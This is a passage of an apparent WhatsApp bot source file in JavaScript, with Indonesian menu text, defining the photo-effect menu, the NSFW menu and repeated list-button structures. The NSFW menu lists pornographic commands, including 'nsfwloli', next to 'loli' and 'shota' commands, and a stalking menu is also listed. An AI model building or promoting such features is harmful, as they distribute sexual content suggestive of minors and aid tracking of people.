        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'ephoto360menubutton': {
 let teks =`◤─「 \`EPHOTO MAKER\` 」─✦
│⦿ 〔 _.glitchtext_
│⦿ 〔 _.writetext_
│⦿ 〔 _.advancedglow_
│⦿ 〔 _.typographytext_
│⦿ 〔 _.pixelglitch_
│⦿ 〔 _.neonglitch_
│⦿ 〔 _.flagtext_
│⦿ 〔 _.flag3dtext_
│⦿ 〔 _.deletingtext_
│⦿ 〔 _.blackpinkstyle_
│⦿ 〔 _.glowingtext_
│⦿ 〔 _.underwatertext_
│⦿ 〔 _.logomaker_
│⦿ 〔 _.cartoonstyle_
│⦿ 〔 _.papercutstyle_
│⦿ 〔 _.watercolortext_
│⦿ 〔 _.effectclouds_
│⦿ 〔 _.blackpinklogo_
│⦿ 〔 _.gradienttext_
│⦿ 〔 _.summerbeach_
│⦿ 〔 _.luxurygold_
│⦿ 〔 _.multicoloredneon_
│⦿ 〔 _.sandsummer_
│⦿ 〔 _.galaxywallpaper_
│⦿ 〔 _.1917style_
│⦿ 〔 _.makingneon_
│⦿ 〔 _.royaltext_
│⦿ 〔 _.freecreate_
│⦿ 〔 _.galaxystyle_
│⦿ 〔 _.lighteffects_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'nsfwmenubutton': {
let teks =`◤─「 \`ANIME\` 」─✦
│⦿ 〔 _.akira_
│⦿ 〔 _.akiyama_
│⦿ 〔 _.ana_
│⦿ 〔 _.asuna_
│⦿ 〔 _.ayuzawa_
│⦿ 〔 _.boruto_
│⦿ 〔 _.chiho_
│⦿ 〔 _.chitoge_
│⦿ 〔 _.cosplayloli_
│⦿ 〔 _.cosplaysagiri_
│⦿ 〔 _.deidara_
│⦿ 〔 _.doraemon_
│⦿ 〔 _.elaina_
│⦿ 〔 _.emilia_
│⦿ 〔 _.erza_
│⦿ 〔 _.gremory_
│⦿ 〔 _.hestia_
│⦿ 〔 _.hinata_
│⦿ 〔 _.husbu_
│⦿ 〔 _.inori_
│⦿ 〔 _.isuzu_
│⦿ 〔 _.itachi_
│⦿ 〔 _.itori_
│⦿ 〔 _.kaga_
│⦿ 〔 _.kagura_
│⦿ 〔 _.kakasih_
│⦿ 〔 _.kaori_
│⦿ 〔 _.keneki_
│⦿ 〔 _.kotori_
│⦿ 〔 _.kurumi_
│⦿ 〔 _.loli_
│⦿ 〔 _.madara_
│⦿ 〔 _.megumin_
│⦿ 〔 _.mikasa_
│⦿ 〔 _.mikey_
│⦿ 〔 _.miku_
│⦿ 〔 _.minato_
│⦿ 〔 _.naruto_
│⦿ 〔 _.neko_
│⦿ 〔 _.neko2_
│⦿ 〔 _.nekonime_
│⦿ 〔 _.nezuko_
│⦿ 〔 _.onepiece_
│⦿ 〔 _.pokemon_
│⦿ 〔 _.randomnime_
│⦿ 〔 _.randomnime2_
│⦿ 〔 _.rize_
│⦿ 〔 _.sagiri_
│⦿ 〔 _.sakura_
│⦿ 〔 _.sasuke_
│⦿ 〔 _.shina_
│⦿ 〔 _.shinka_
│⦿ 〔 _.shinomiya_
│⦿ 〔 _.shizuka_
│⦿ 〔 _.shota_
│⦿ 〔 _.tejina_
│⦿ 〔 _.toukachan_
│⦿ 〔 _.tsunade_
│⦿ 〔 _.waifu_
│⦿ 〔 _.animewall_
│⦿ 〔 _.yotsuba_
│⦿ 〔 _.yuki_
│⦿ 〔 _.yulibocil_
│⦿ 〔 _.yumeko_
│⦿ 〔 _.8ball_
│⦿ 〔 _.tickle_
│⦿ 〔 _.gecg_
│⦿ 〔 _.feed_
│⦿ 〔 _.animeawoo_
│⦿ 〔 _.animemegumin_
│⦿ 〔 _.animeshinobu_
│⦿ 〔 _.animehandhold_
│⦿ 〔 _.animehighfive_
│⦿ 〔 _.animecringe_
│⦿ 〔 _.animedance_
│⦿ 〔 _.animehappy_
│⦿ 〔 _.animeglomp_
│⦿ 〔 _.animeblush_
│⦿ 〔 _.animesmug_
│⦿ 〔 _.animewave_
│⦿ 〔 _.animesmile_
│⦿ 〔 _.animepoke_
│⦿ 〔 _.animewink_
│⦿ 〔 _.animebonk_
│⦿ 〔 _.animebully_
│⦿ 〔 _.animeyeet_
│⦿ 〔 _.animebite_
│⦿ 〔 _.animelick_
│⦿ 〔 _.animekill_
│⦿ 〔 _.animecry_
│⦿ 〔 _.animewlp_
│⦿ 〔 _.animekiss_
│⦿ 〔 _.animehug_
│⦿ 〔 _.animeneko_
│⦿ 〔 _.animepat_
│⦿ 〔 _.animeslap_
│⦿ 〔 _.animecuddle_
│⦿ 〔 _.animewaifu_
│⦿ 〔 _.animenom_
│⦿ 〔 _.animefoxgirl_
│⦿ 〔 _.animegecg_
│⦿ 〔 _.animetickle_
│⦿ 〔 _.animefeed_
│⦿ 〔 _.animeavatar_
│⦿ 〔 _.genshin_
│⦿ 〔 _.anime_
│⦿ 〔 _.amv_
◣──────────❈
◤─「 \`NSFW MENU\` 」─✦
│⦿ 〔 _.hentai_
│⦿ 〔 _.listbkp_
│⦿ 〔 _.gifhenta_
│⦿ 〔 _.gifblowjob_ 
│⦿ 〔 _.hentaivid_ 
│⦿ 〔 _.hneko_ 
│⦿ 〔 _.nwaifu_ 
│⦿ 〔 _.animespank_ 
│⦿ 〔 _.trap_ 
│⦿ 〔 _.gasm_ 
│⦿ 〔 _.ahegao_ 
│⦿ 〔 _.ass_ 
│⦿ 〔 _.bdsm_
│⦿ 〔 _.blowjob_ 
│⦿ 〔 _.cuckold_ 
│⦿ 〔 _.cum_ 
│⦿ 〔 _.milf_ 
│⦿ 〔 _.eba_ 
│⦿ 〔 _.ero_ 
│⦿ 〔 _.femdom_ 
│⦿ 〔 _.foot_ 
│⦿ 〔 _.gangbang_ 
│⦿ 〔 _.glasses_ 
│⦿ 〔 _.jahy_ 
│⦿ 〔 _.masturbation_
│⦿ 〔 _.mangasearch_ 
│⦿ 〔 _.neko-hentai_ 
│⦿ 〔 _.neko-hentai2_ 
│⦿ 〔 _.nsfwloli_ 
│⦿ 〔 _.orgy_
│⦿ 〔 _.panties_  
│⦿ 〔 _.pussy_ 
│⦿ 〔 _.tentacles_ 
│⦿ 〔 _.thighs_ 
│⦿ 〔 _.yuri_ 
│⦿ 〔 _.zettai_
│⦿ 〔 _.xnxxsearch_
│⦿ 〔 _.xnxxdl_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
